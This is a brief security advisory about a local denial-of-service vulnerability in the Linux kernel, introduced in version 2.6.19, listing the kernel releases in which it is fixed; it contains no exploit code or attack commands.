The Linux kernel is prone to a local denial-of-service vulnerability.

Attackers can exploit this issue to cause an affected process to hang, denying service to legitimate users. Other denial-of-service attacks are also possible.

This issue was introduced in Linux Kernel 2.6.19. The following versions have been fixed:

Linux Kernel 2.6.30-rc3
Linux Kernel 2.6.27.24
Linux Kernel 2.6.29.4
